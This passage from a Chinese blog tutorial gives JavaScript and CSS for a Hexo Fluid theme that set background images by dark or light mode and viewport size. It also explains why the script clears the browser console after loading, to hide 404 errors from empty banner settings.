#D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">PAGE_EXCLUSIONS</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">some</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">excluded</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">path</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">startsWith</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">excluded</span><span style="color: #D4D4D4">));</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * 判断是否为移动端视口。</span></span><span class="line"><span style="color: #6A9955"> * </span><span style="color: #569CD6">@returns</span><span style="color: #6A9955"> </span><span style="color: #4EC9B0">{boolean}</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">isMobileViewport</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">window</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">innerWidth</span><span style="color: #D4D4D4"> &lt; </span><span style="color: #B5CEA8">768</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * 移除 banner 遮罩，避免背景图层被半透明黑层覆盖。</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">removeBannerMask</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">mask</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">querySelector</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"#banner .mask"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">mask</span><span style="color: #D4D4D4">) </span><span style="color: #9CDCFE">mask</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">style</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">backgroundColor</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">"rgba(0,0,0,0)"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * 预加载所有背景图片，降低首帧闪烁。</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">preloadBackgroundImages</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">urls</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Set</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 收集所有图片 URL</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">Object</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">values</span><span style="color: #D4D4D4">(</span><span style="color: #4FC1FF">BACKGROUND_IMAGES</span><span style="color: #D4D4D4">).</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">entry</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">typeof</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">entry</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"object"</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">urls</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">add</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">entry</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">desktop</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">urls</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">add</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">entry</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">mobile</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">urls</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">add</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">entry</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">// 创建 Image 对象触发加载</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">urls</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">((</span><span style="color: #9CDCFE">url</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">img</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">Image</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">img</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">src</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">url</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * 根据当前模式 / 视口或自定义 URL 设置背景图。</span></span><span class="line"><span style="color: #6A9955"> * </span><span style="color: #569CD6">@param</span><span style="color: #6A9955"> </span><span style="color: #4EC9B0">{"dark" | "light" | null}</span><span style="color: #6A9955"> </span><span style="color: #9CDCFE">mode</span><span style="color: #6A9955"> - 当前颜色模式；null 表示排除页面</span></span><span class="line"><span style="color: #6A9955"> * </span><span style="color: #569CD6">@param</span><span style="color: #6A9955"> </span><span style="color: #4EC9B0">{string}</span><span style="color: #6A9955"> </span><span style="color: #9CDCFE">[customUrl]</span><span style="color: #6A9955"> - 强制使用的自定义链接（优先级最高）</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">applyBackgroundImage</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">mode</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">customUrl</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">mobile</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">isMobileViewport</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">let</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">imageUrl</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">customUrl</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 若明确指定自定义 URL，则直接使用</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">imageUrl</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">customUrl</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">mode</span><span style="color: #D4D4D4"> === </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 排除页面：桌面使用 fallback，移动端统一 dark.mobile</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">imageUrl</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">mobile</span></span><span class="line"><span style="color: #D4D4D4">      ? </span><span style="color: #4FC1FF">BACKGROUND_IMAGES</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">dark</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">mobile</span></span><span class="line"><span style="color: #D4D4D4">      : </span><span style="color: #4FC1FF">BACKGROUND_IMAGES</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">fallback</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #DCDCAA">isExcludedPage</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">location</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">pathname</span><span style="color: #D4D4D4">) &amp;&amp; </span><span style="color: #9CDCFE">mode</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 非排除页面：根据模式 + 视口选择</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">imageUrl</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">mobile</span></span><span class="line"><span style="color: #D4D4D4">      ? </span><span style="color: #4FC1FF">BACKGROUND_IMAGES</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">mode</span><span style="color: #D4D4D4">].</span><span style="color: #9CDCFE">mobile</span></span><span class="line"><span style="color: #D4D4D4">      : </span><span style="color: #4FC1FF">BACKGROUND_IMAGES</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">mode</span><span style="color: #D4D4D4">].</span><span style="color: #9CDCFE">desktop</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 处理从移动端切换回桌面端时可能出现的背景错乱</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">imageUrl</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">mobile</span></span><span class="line"><span style="color: #D4D4D4">      ? </span><span style="color: #4FC1FF">BACKGROUND_IMAGES</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">dark</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">mobile</span></span><span class="line"><span style="color: #D4D4D4">      : </span><span style="color: #4FC1FF">BACKGROUND_IMAGES</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">fallback</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">backgroundContainer</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">style</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">backgroundImage</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">`url(</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">imageUrl</span><span style="color: #569CD6">}</span><span style="color: #CE9178">)`</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * 获取用户当前的颜色模式（深/浅）。</span></span><span class="line"><span style="color: #6A9955"> * </span><span style="color: #569CD6">@returns</span><span style="color: #6A9955"> </span><span style="color: #4EC9B0">{"dark" | "light"}</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">getUserColorScheme</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">mode</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">documentElement</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">getAttribute</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"data-user-color-scheme"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">mode</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"dark"</span><span style="color: #D4D4D4"> ? </span><span style="color: #CE9178">"dark"</span><span style="color: #D4D4D4"> : </span><span style="color: #CE9178">"light"</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * 颜色模式切换后的回调：重新应用背景并移除遮罩。</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">handleColorSchemeToggle</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">mode</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">getUserColorScheme</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #DCDCAA">isExcludedPage</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">location</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">pathname</span><span style="color: #D4D4D4">)) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">applyBackgroundImage</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">mode</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">removeBannerMask</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// === 视口 Resize 处理（防抖） ===</span></span><span class="line"><span style="color: #569CD6">let</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">resizeTimer</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">// 定时器句柄</span></span><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * 窗口大小变化事件的处理函数（含 200ms 防抖）。</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">handleViewportResize</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">clearTimeout</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">resizeTimer</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">resizeTimer</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">setTimeout</span><span style="color: #D4D4D4">(() </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">applyBackgroundImage</span><span style="color: #D4D4D4">(</span><span style="color: #DCDCAA">getUserColorScheme</span><span style="color: #D4D4D4">());</span></span><span class="line"><span style="color: #D4D4D4">  }, </span><span style="color: #B5CEA8">200</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// === 监听颜色模式属性变化 ===</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">observeColorSchemeChange</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">targetNode</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">documentElement</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">config</span><span style="color: #D4D4D4"> = {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">attributes:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">attributeFilter:</span><span style="color: #D4D4D4"> [</span><span style="color: #CE9178">"data-user-color-scheme"</span><span style="color: #D4D4D4">],</span></span><span class="line"><span style="color: #D4D4D4">  };</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">callback</span><span style="color: #D4D4D4"> = (</span><span style="color: #9CDCFE">mutationsList</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">for</span><span style="color: #D4D4D4"> (</span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">mutation</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">of</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">mutationsList</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">mutation</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">type</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"attributes"</span><span style="color: #D4D4D4"> &amp;&amp;</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">mutation</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">attributeName</span><span style="color: #D4D4D4"> === </span><span style="color: #CE9178">"data-user-color-scheme"</span></span><span class="line"><span style="color: #D4D4D4">      ) {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #DCDCAA">handleColorSchemeToggle</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  };</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">observer</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">new</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">MutationObserver</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">callback</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">observer</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">observe</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">targetNode</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">config</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// === 初始化 ===</span></span><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * 初始化背景：预加载 → 根据当前页面 &amp; 模式设置 → 去掉遮罩。</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">initializeBackgrounds</span><span style="color: #D4D4D4"> = () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">preloadBackgroundImages</span><span style="color: #D4D4D4">();</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">currentPath</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">location</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">pathname</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">currentMode</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">getUserColorScheme</span><span style="color: #D4D4D4">();</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #4FC1FF">PAGE_EXCLUSIONS</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">includes</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">currentPath</span><span style="color: #D4D4D4">)) {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">applyBackgroundImage</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">applyBackgroundImage</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">currentMode</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">removeBannerMask</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// === 事件监听 ===</span></span><span class="line"><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (!</span><span style="color: #9CDCFE">colorToggleButton</span><span style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">warn</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"未找到颜色模式切换按钮"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 监听颜色模式属性变化</span></span><span class="line"><span style="color: #DCDCAA">observeColorSchemeChange</span><span style="color: #D4D4D4">();</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 监听窗口大小变化</span></span><span class="line"><span style="color: #9CDCFE">window</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">addEventListener</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"resize"</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">handleViewportResize</span><span style="color: #D4D4D4">, { </span><span style="color: #9CDCFE">passive:</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4"> });</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// DOMContentLoaded → 初始化背景</span></span><span class="line"><span style="color: #9CDCFE">window</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">addEventListener</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"DOMContentLoaded"</span><span style="color: #D4D4D4">, () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"DOM 完成，开始初始化背景图。"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">initializeBackgrounds</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">});</span></span><span class="line"></span><span class="line"><span style="color: #6A9955">// 加载完毕之后清除控制台日志</span></span><span class="line"><span style="color: #9CDCFE">window</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">addEventListener</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"load"</span><span style="color: #D4D4D4">, () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">clear</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">});</span></span></code></pre></div></div></figure><p>该代码文件还需结合一个自定义的 css 文件使用：<code>source/css/backgroundize.css</code></p><figure class="shiki css"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D7BA7D">#web_bg</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">fixed</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">z-index</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">-1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-size</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">cover</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #6A9955">/* 添加过渡效果，你也可以自定义 */</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">transition</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">all</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0.5s</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>在 <code>backgroundize.js</code> 文件中，我们手动指定了背景图、切换逻辑，所以上一节的第二段代码已不再有作用，故在此删去。</p><p>在 <code>backgroundize.js</code> 文件中，若你有更多自定义页面图片需求，你将能够很方便的实现它。</p><p>在 <code>backgroundize.css</code> 中，我们依然将 <code>web_bg</code> 设置为 <code>fixed</code> 将其固定，并设置 <code>z-index: -1</code> 保持沉底。</p><p>因为在<code>_config.fluid.yml</code> 中我们将 <code>banner_img</code> 配置项全部配置为空，那么控制台将会出现 404 错误：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202505232039826.png" alt="image-20250523203906585"></p><p>眼不见心不烦，所以在 <code>backgroundize.js</code> 中存在下面的代码：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 加载完毕之后清除控制台日志</span></span><span class="line"><span style="color: #9CDCFE">window</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">addEventListener</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"load"</span><span style="color: #D4D4D4">, () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">console</span><span 